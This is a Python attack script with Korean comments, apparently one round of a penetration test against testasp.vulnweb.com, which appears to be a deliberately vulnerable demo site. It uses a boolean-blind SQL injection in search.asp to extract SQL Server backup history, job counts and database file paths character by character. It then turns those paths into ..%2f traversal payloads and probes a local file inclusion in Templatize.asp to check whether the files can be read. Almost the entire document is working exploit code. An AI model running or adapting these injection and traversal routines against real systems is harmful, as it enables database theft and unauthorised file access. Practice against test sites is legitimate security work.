#!/usr/bin/env python3
"""Round 10 — 백업/DB 파일 경로 확인 (읽기 전용).

A) msdb 백업 이력 / SQL Agent 작업 / master_files 규모
B) SERVERPROPERTY 기본 경로 + backupmediafamily.physical_device_name + master_files.physical_name
C) ★ 웹루트는 C:\\ 바로 아래 2단계(Round 7 실측) → ..%2f×2 = C:\\ 이므로,
      "절대경로 C:\\X\\Y\\Z" 는 LFI 상대경로 ..%2f..%2fX%2fY%2fZ 로 정확히 도달한다.
      발견한 경로를 전부 Templatize LFI 로 실존/도달 여부 검증(= 파일이 웹앱에서 읽히는지).
전부 읽기 전용. 상태 변경·파일 생성 없음.
"""
import json, urllib.parse, urllib.request, urllib.error, sys

SEARCH = "http://testasp.vulnweb.com/search.asp"
TMPL = "http://testasp.vulnweb.com/Templatize.asp?item="
REQ = {"n": 0}


def _get(url):
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            return r.status, r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")
    except Exception as e:
        return 0, str(e)


def oracle(cond):
    st = "zzq')>0 OR (" + cond + "))--"
    url = SEARCH + "?tfSearch=" + urllib.parse.quote(st, safe="")
    code, body = _get(url)
    if code == 500:
        return None
    return "class='posttext'" in body


def exact_int(expr, lo=0, hi=200000):
    if oracle(f"({expr})>={lo}") is not True:
        return None
    while lo < hi:
        mid = (lo + hi + 1) // 2
        r = oracle(f"({expr})>={mid}")
        if r is True:
            lo = mid
        elif r is False:
            hi = mid - 1
        else:
            return None
    return lo


def extract(expr, n):
    out = ""
    for i in range(1, n + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>"
        if lo <= 1:
            break
        out += chr(lo)
    return out


def sget(expr, cap=80):
    if oracle(f"({expr}) IS NOT NULL") is not True:
        return None
    ln = exact_int(f"LEN({expr})", 1, cap)
    return extract(expr, ln) if ln else None


R = {}
print("### A. 규모 파악 (읽기 전용)")
if oracle("1=1") is not True:
    print("!! 오라클 불안정 — 중단"); sys.exit(1)
for lab, e in [("msdb.dbo.backupset 행수", "(SELECT COUNT(*) FROM msdb.dbo.backupset)"),
               ("msdb.dbo.backupmediafamily 행수", "(SELECT COUNT(*) FROM msdb.dbo.backupmediafamily)"),
               ("msdb.dbo.backupfile 행수", "(SELECT COUNT(*) FROM msdb.dbo.backupfile)"),
               ("msdb.dbo.sysjobs 행수(SQL Agent 작업)", "(SELECT COUNT(*) FROM msdb.dbo.sysjobs)"),
               ("sys.master_files 행수", "(SELECT COUNT(*) FROM sys.master_files)"),
               ("sys.databases 행수", "(SELECT COUNT(*) FROM sys.databases)")]:
    v = exact_int(e, 0, 5000); R[lab] = v
    print(f"  = {v}   {lab}")
for lab, c in [("sys.dm_server_services 조회 가능", "(SELECT COUNT(*) FROM sys.dm_server_services)>=0"),
               ("msdb.dbo.backuphistory 조회 가능", "(SELECT COUNT(*) FROM msdb.dbo.backuphistory)>=0"),
               ("sys.dm_os_sys_info 조회 가능", "(SELECT COUNT(*) FROM sys.dm_os_sys_info)>0")]:
    v = oracle(c); R[lab] = v
    print(f"  {'TRUE ' if v else 'FALSE'}  {lab}")

print("\n### B. 경로 문자열 추출 (문자당 7요청 — 상한 걸어둠)")
paths = {}
for lab, e, cap in [
    ("InstanceDefaultDataPath", "CAST(SERVERPROPERTY('InstanceDefaultDataPath') AS varchar(200))", 70),
    ("InstanceDefaultLogPath", "CAST(SERVERPROPERTY('InstanceDefaultLogPath') AS varchar(200))", 70),
    ("InstanceDefaultBackupPath", "CAST(SERVERPROPERTY('InstanceDefaultBackupPath') AS varchar(200))", 70),
    ("backupmediafamily.physical_device_name", "(SELECT MIN(physical_device_name) FROM msdb.dbo.backupmediafamily)", 90),
    ("master_files DB=acuforum file_id=1", "(SELECT physical_name FROM sys.master_files WHERE database_id=DB_ID('acuforum') AND file_id=1)", 90),
    ("master_files DB=acuforum file_id=2", "(SELECT physical_name FROM sys.master_files WHERE database_id=DB_ID('acuforum') AND file_id=2)", 90),
]:
    v = sget(e, cap)
    paths[lab] = v
    print(f"  {lab} = {v!r}")
R["paths"] = paths

print("\n### C. ★ LFI 도달 검증 — 절대경로를 ..%2f×2 기준 상대경로로 변환해 실존 확인")
def to_lfi(p):
    if not p or "<?>" in p:
        return None
    q = p.strip().replace("\\", "/")
    if len(q) > 1 and q[1] == ":":
        q = q[3:]                      # 드라이브 제거 (C:\ 제거)
    if not q:
        return None
    return "..%2f..%2f" + q.replace("/", "%2f")

reach = {}
for lab, p in paths.items():
    rel = to_lfi(p)
    if not rel:
        print(f"  {lab}: 경로 없음/불완전 — 스킵"); continue
    code, body = _get(TMPL + rel)
    ok = code == 200 and len(body) > 1300
    reach[lab] = {"lfi_item": rel, "code": code, "size": len(body), "reachable": ok}
    print(f"  {lab}\n     item={rel}\n     → {code} size={len(body)}  {'★ 도달 가능' if ok else '차단/부재'}")
R["lfi_reachability"] = reach

R["requests"] = REQ["n"]
with open("out/backup_paths.json", "w", encoding="utf-8") as f:
    json.dump(R, f, ensure_ascii=False, indent=2)
print(f"\n### 완료 — 총 요청 {REQ['n']}건 → out/backup_paths.json")
